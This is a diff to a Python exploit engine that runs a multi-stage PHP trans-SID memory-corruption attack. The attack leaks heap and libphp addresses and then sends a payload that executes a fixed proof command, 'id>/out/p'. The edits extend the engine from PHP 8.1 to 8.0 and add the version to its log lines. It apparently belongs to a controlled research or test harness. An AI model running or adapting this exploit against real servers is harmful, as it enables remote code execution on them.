@@ -184,7 +184,7 @@ def _http_body(response: bytes) -> bytes:
             raise ProfileError("PHP 8.1 B1 response has truncated chunk data")
         output += rest[:size]
         body = rest[size + 2:]
-    raise ProfileError("PHP 8.1 B1 response has no terminal HTTP chunk")
+    raise ProfileError("trans-SID B1 response has no terminal HTTP chunk")
 
 
 @dataclass(frozen=True)
@@ -199,19 +199,20 @@ class Php81Disclosure:
 
 
 class Php81TransSidExploit:
-    """Build and execute the exact PHP 8.1 A1/B1/A2/B2 sequence."""
+    """Build and execute an exact profile-bound PHP 8.0/8.1 sequence."""
 
     def __init__(self, target: Any, profile: Profile, command: bytes):
         if profile.strategy != "php81-trans-sid-v1":
-            raise ProfileError("PHP 8.1 trans-SID engine received the wrong strategy")
+            raise ProfileError("PHP 8.x trans-SID engine received the wrong strategy")
         if command != FIXED_COMMAND:
-            raise ProfileError("PHP 8.1 trans-SID engine accepts only id>/out/p")
+            raise ProfileError("PHP 8.x trans-SID engine accepts only id>/out/p")
         self.target = target
         self.profile = profile
         self.command = command
         self.recipe = profile.raw["request_recipe"]
         self.runtime = profile.raw["runtime"]
         self.abi = profile.raw["abi"]
+        self.php_version = profile.raw["build"]["php"]["version"]
         self.page_size = parse_hex(self.abi["page_size"], "abi.page_size")
         self.chunk_size = parse_hex(
             self.abi["zend_mm_chunk_size"], "abi.zend_mm_chunk_size"
@@ -562,7 +563,9 @@ class Php81TransSidExploit:
 
     def run(self, proof: Path, retries: int) -> int:
         for attempt in range(1, retries + 1):
-            self.target.log(f"[*] PHP 8.1 trans-SID A1 ({attempt}/{retries})")
+            self.target.log(
+                f"[*] PHP {self.php_version} trans-SID A1 ({attempt}/{retries})"
+            )
             a1, a1_boundary, query = self.build_a1()
             self.target.post_chunked(
                 a1, a1_boundary, query=query, read_cap=1 << 20, timeout=180.0
@@ -570,7 +573,9 @@ class Php81TransSidExploit:
             del a1
             time.sleep(0.2)
 
-            self.target.log(f"[*] PHP 8.1 trans-SID B1 ({attempt}/{retries})")
+            self.target.log(
+                f"[*] PHP {self.php_version} trans-SID B1 ({attempt}/{retries})"
+            )
             b1, b1_boundary, query = self.build_b1()
             fake_len = parse_hex(self.recipe["b1"]["fake_len"], "b1.fake_len")
             response = self.target.post_chunked(
@@ -584,22 +589,29 @@ class Php81TransSidExploit:
             try:
                 disclosure = self.parse_b1(response)
             except ProfileError as exc:
-                self.target.log(f"[-] PHP 8.1 B1 rejected: {exc}")
+                self.target.log(f"[-] PHP {self.php_version} B1 rejected: {exc}")
                 continue
             self.target.log(
-                f"[+] PHP 8.1 B1 disclosed 0x{disclosure.leak_length:x} bytes; "
+                f"[+] PHP {self.php_version} B1 disclosed "
+                f"0x{disclosure.leak_length:x} bytes; "
                 f"main=0x{disclosure.main_chunk:x}; libphp=0x{disclosure.libphp_base:x}; "
                 f"dtor_hits={disclosure.dtor_hits}"
             )
 
-            self.target.log("[*] PHP 8.1 trans-SID A2 (streaming 160 MiB scalar)")
+            self.target.log(
+                f"[*] PHP {self.php_version} trans-SID A2 "
+                "(streaming 160 MiB scalar)"
+            )
             a2_chunks, a2_boundary = self.build_a2()
             self.target.post_chunked_iter(
                 a2_chunks, a2_boundary, read_cap=1 << 20, timeout=240.0
             )
             time.sleep(0.3)
 
-            self.target.log("[*] PHP 8.1 trans-SID B2 (fixed id>/out/p proof)")
+            self.target.log(
+                f"[*] PHP {self.php_version} trans-SID B2 "
+                "(fixed id>/out/p proof)"
+            )
             b2, b2_boundary = self.build_b2(
                 disclosure.main_chunk, disclosure.libphp_base
             )
